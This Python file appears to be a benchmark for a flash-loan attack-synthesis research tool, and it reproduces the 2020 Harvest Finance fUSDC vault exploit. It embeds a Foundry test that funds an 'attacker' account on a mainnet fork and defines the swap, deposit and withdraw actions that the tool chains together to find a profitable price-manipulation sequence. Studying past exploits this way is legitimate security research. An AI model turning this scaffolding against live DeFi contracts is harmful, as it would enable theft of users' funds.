import sys
import os
import config

SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
sys.path.append(os.path.dirname(SCRIPT_DIR))
sys.path.append(os.path.dirname(os.path.dirname(SCRIPT_DIR)))

from Actions.macros import *
from Actions.Utils import *
from Actions.UtilsPrecision import *
from Actions.Action import *
from Actions.AttackDAG import *
from FlashSynProActions.ActionPro import *
from synthesizer import *


class HarvestUSDTAction(ActionPro):
    # Capital the historical exploit flash-loaned; profit is measured against these.
    initialBalances = {"USDT": 18308555.417594, "USDC": 50000000}  # keep consistent with the foundry script

    currentBalances = initialBalances.copy()  # Don't change

    # Both legs are USD stablecoins, so profit is just the summed balance change.
    TokenPrices = {"USDT": 1.0, "USDC": 1.0}

    TargetTokens = TokenPrices.keys()    # Don't change: tokens of interest

    # Preamble of the foundry script, identical to examples/harvest_usdt/attack.t.sol
    # up to (but not including) the first collector/helper function.
    start_str = '''// SPDX-License-Identifier: MIT
pragma solidity >0.4.21;

// Harvest Finance exploit (fUSDC vault), 26 Oct 2020, block 11129474
// tx: 0x35f8d2f572fceaac9288e5d462117850ef2694786992a8c3f6d02612277b0877

import {DSTest} from "ds-test/test.sol";
import {Utilities} from "./utils/Utilities.sol";
import {console} from "./utils/Console.sol";
import {Vm} from "forge-std/Vm.sol";
import {stdCheats} from "forge-std/stdlib.sol";
import {Strings} from "mylib/StringCon.sol";
import "ds-test/test.sol";


interface IUSDC {
    function approve(address spender, uint256 value) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function configureMinter(address minter, uint256 minterAllowedAmount) external returns (bool);
    function masterMinter() external view returns (address);
    function mint(address _to, uint256 _amount) external returns (bool);
    function transfer(address to, uint256 value) external returns (bool);
}

interface IUSDT {
    function approve(address spender, uint256 value) external;
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 value) external;
}

interface ICurve {
    function exchange_underlying(int128 i, int128 j, uint256 dx, uint256 min_dy) external;
    function balances(uint256 i) external view returns (uint256);
}

interface IfUSDC {
    function deposit(uint256 amount) external;
    function withdraw(uint256 numberOfShares) external;
    function balanceOf(address account) external view returns (uint256);
}

contract Harvest_USDT is DSTest, stdCheats {
    Vm internal constant vm = Vm(HEVM_ADDRESS);
    address payable constant attacker = payable(address(uint160(uint256(keccak256(abi.encodePacked("attacker"))))));
    IUSDC internal constant USDC = IUSDC(address(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48));
    IUSDT internal constant USDT = IUSDT(address(0xdAC17F958D2ee523a2206206994597C13D831ec7));
    ICurve internal constant CURVE = ICurve(address(0x45F783CCE6B7FF23B2ab2D70e416cdb7D6055f51));
    IfUSDC internal constant fUSDC = IfUSDC(address(0xf0358e8c3CD5Fa238a29301d0bEa3D63A17bEdBE));

    uint256 constant USDC_CAPITAL = 50000000e6;
    uint256 constant USDT_CAPITAL = 18308555417594;

    function setUp() public {
        vm.label(attacker, "Attacker");

        address minter = address(0x9BEF5148fD530244a14830f4984f2B76BCa0dC58);
        address MasterMinter = USDC.masterMinter();
        vm.startPrank(MasterMinter);
        USDC.configureMinter(minter, 2 ** 256 - 1);
        vm.stopPrank();
        vm.startPrank(minter);
        USDC.mint(attacker, USDC_CAPITAL);
        vm.stopPrank();

        vm.store(address(USDT), keccak256(abi.encode(attacker, uint256(2))), bytes32(USDT_CAPITAL));
        require(USDT.balanceOf(attacker) == USDT_CAPITAL, "USDT funding failed");
        require(USDC.balanceOf(attacker) == USDC_CAPITAL, "USDC funding failed");

        vm.startPrank(attacker);
        USDT.approve(address(CURVE), type(uint256).max);
        USDC.approve(address(CURVE), type(uint256).max);
        USDC.approve(address(fUSDC), type(uint256).max);
    }

    function profitSummary() public view returns (string memory) {
        return Strings.append(
            "FlashSyn ",
            Strings.appendWithSpace(USDT.balanceOf(address(attacker)) / 1e6, USDC.balanceOf(address(attacker)) / 1e6)
        );
    }
    '''

    # stats = [USDT balance, USDC balance] (whole tokens), parsed from profitSummary().
    def calcProfit(stats):
        if stats == None or len(stats) != 2:
            return 0
        return (stats[0] - HarvestUSDTAction.initialBalances['USDT']) \
             + (stats[1] - HarvestUSDTAction.initialBalances['USDC'])

    @classmethod
    def initialPass(cls, actionList, actionDependencies, ActionWrapper, maxLen = None):
        if maxLen == None:
            largestLen = 0
            for actionDependency in actionDependencies:
                if len(actionDependency) > largestLen:
                    largestLen = len(actionDependency)
            maxLen = largestLen

        action_list_1 = actionList
        actionSpecs = []
        for ii in range(len(actionDependencies)):
            temp = actionDependencies[ii] + [actionList[ii]]
            actionSpecs.append( temp )
        start = time.time()
        initialPassCollectData4( actionSpecs , ActionWrapper, TargetDataPoints = 500, maxLenGlobal = maxLen)
        ShowDataPointsForEachAction( action_list_1 )
        end = time.time()
        print("in total it takes %f seconds" % (end - start))

    @classmethod
    def runinitialPass(cls):
        map = loadDataPoints()
        helpMap = {}
        for key in map.keys():
            payload = map[key]
            if len(payload) < 3:
                sys.exit("stale data file '{}.pkl' (pre-registry format); "
                         "re-run data collection".format(key))
            points, values, names = payload[0], payload[1], payload[2]
            actionStr = names[-1]
            actionList = [cls.action_by_name(n) for n in names]
            if len(points) > 0:
                helpMap.setdefault(actionStr, {})[key] = (actionList, [points, values])
        for actionStr in helpMap.keys():
            approx = NumericalApproximatorsPro(helpMap[actionStr])
            target = cls.action_by_name(actionStr)
            target.approximators = approx
            target.approximators.refreshTransitFormula()


class Curve_USDT2USDC(HarvestUSDTAction):
    approximators = NumericalApproximatorsPro()

    numInputs = 1
    tokensIn = ['USDT']
    tokensOut = ['USDC']
    range = [0, 20000000]

    @classmethod
    def actionStr(cls):
        action = '''        // Action: Curve_USDT2USDC
        CURVE.exchange_underlying(2, 1, $$ * 1e6, 0);
        '''
        return action

    @classmethod
    def collectorStr(cls):
        action = '''        // Collect Curve_USDT2USDC: USDT --> USDC
        uint USDCgot = USDC.balanceOf(address(attacker));
        CURVE.exchange_underlying(2, 1, $$ * 1e6, 0);
        USDCgot = USDC.balanceOf(address(attacker)) - USDCgot;
        revert(Strings.append("FlashSyn: ", USDCgot / 1e6));
        '''
        return action

    @classmethod
    def transit(cls, inputs, actionList):
        cls.currentBalances["USDT"] -= inputs[-1]
        output0 = cls.simulate(inputs, actionList)[0]
        cls.currentBalances["USDC"] += output0
        return


class Curve_USDC2USDT(HarvestUSDTAction):
    approximators = NumericalApproximatorsPro()

    numInputs = 1
    tokensIn = ['USDC']
    tokensOut = ['USDT']
    range = [0, 20000000]

    @classmethod
    def actionStr(cls):
        action = '''        // Action: Curve_USDC2USDT
        CURVE.exchange_underlying(1, 2, $$ * 1e6, 0);
        '''
        return action

    @classmethod
    def collectorStr(cls):
        action = '''        // Collect Curve_USDC2USDT: USDC --> USDT
        uint USDTgot = USDT.balanceOf(address(attacker));
        CURVE.exchange_underlying(1, 2, $$ * 1e6, 0);
        USDTgot = USDT.balanceOf(address(attacker)) - USDTgot;
        revert(Strings.append("FlashSyn: ", USDTgot / 1e6));
        '''
        return action

    @classmethod
    def transit(cls, inputs, actionList):
        cls.currentBalances["USDC"] -= inputs[-1]
        output0 = cls.simulate(inputs, actionList)[0]
        cls.currentBalances["USDT"] += output0
        return


class fUSDC_deposit(HarvestUSDTAction):
    approximators = NumericalApproximatorsPro()

    numInputs = 1
    tokensIn = ['USDC']
    tokensOut = ['fUSDC']
    range = [0, 50000000]

    @classmethod
    def actionStr(cls):
        action = '''        // Action: fUSDC_deposit
        fUSDC.deposit($$ * 1e6);
        '''
        return action

    @classmethod
    def collectorStr(cls):
        action = '''        // Collect fUSDC_deposit: USDC --> fUSDC
        uint fUSDCgot = fUSDC.balanceOf(address(attacker));
        fUSDC.deposit($$ * 1e6);
        fUSDCgot = fUSDC.balanceOf(address(attacker)) - fUSDCgot;
        revert(Strings.append("FlashSyn: ", fUSDCgot / 1e6));
        '''
        return action

    @classmethod
    def transit(cls, inputs, actionList):
        cls.currentBalances["USDC"] -= inputs[-1]
        output0 = cls.simulate(inputs, actionList)[0]
        if "fUSDC" not in cls.currentBalances:
            cls.currentBalances["fUSDC"] = 0
        cls.currentBalances["fUSDC"] += output0
        return


class fUSDC_withdraw(HarvestUSDTAction):
    approximators = NumericalApproximatorsPro()

    numInputs = 1
    tokensIn = ['fUSDC']
    tokensOut = ['USDC']
    range = [0, 60000000]

    @classmethod
    def actionStr(cls):
        action = '''        // Action: fUSDC_withdraw
        fUSDC.withdraw($$ * 1e6);
        '''
        return action

    @classmethod
    def collectorStr(cls):
        action = '''        // Collect fUSDC_withdraw: fUSDC --> USDC
        uint USDCgot = USDC.balanceOf(address(attacker));
        fUSDC.withdraw($$ * 1e6);
        USDCgot = USDC.balanceOf(address(attacker)) - USDCgot;
        revert(Strings.append("FlashSyn: ", USDCgot / 1e6));
        '''
        return action

    @classmethod
    def transit(cls, inputs, actionList):
        cls.currentBalances["fUSDC"] -= inputs[-1]
        output0 = cls.simulate(inputs, actionList)[0]
        cls.currentBalances["USDC"] += output0
        return


def main():
    config.ExecutionMode = DVD

    config.command = "./run.sh Harvest_USDT ETH 11129474"
    config.benchmarkName = "harvest_usdt"

    # ===========================================================================================================
    # =========================== run dependencyCheck.py to get the following information =====================
    # ===========================================================================================================

    action1 = Curve_USDT2USDC
    action2 = Curve_USDC2USDT
    action3 = fUSDC_deposit
    action4 = fUSDC_withdraw

    action_list = [action1, action2, action3, action4]

    # If unsure about prestates, list all other actions (safe default).
    action1_prestate_dependency = [action2, action3, action4] + [action1]
    action2_prestate_dependency = [action1, action3, action4] + [action2]
    action3_prestate_dependency = [action1, action2, action4] + [action3]
    action4_prestate_dependency = [action1, action2, action3] + [action4]

    actionDependencies = [action1_prestate_dependency, action2_prestate_dependency,
                          action3_prestate_dependency, action4_prestate_dependency]

    actionDependency = generateActionDependency(action_list, actionDependencies)

    attackDAGGenerator.setActionDependency(actionDependency)

    # ===========================================================================================================
    # =========================== Set up execution parameters ===================================================
    # ===========================================================================================================

    ActionWrapper = HarvestUSDTAction
    ActionWrapper.initialPass(action_list, actionDependencies, ActionWrapper)


    # CounterExampleLoop = True
    # Pruning = True
    # maxSynthesisLen = 4

    # ActionWrapper.runinitialPass()
    # config.benchmarkName = "harvest_usdt"
    # config.processNum = 1

    # Synthesizer = synthesizer(action_list, HarvestUSDTAction, config.processNum)
    # Synthesizer.synthesis(maxSynthesisLen, Pruning, CounterExampleLoop)



if __name__ == "__main__":
    main()
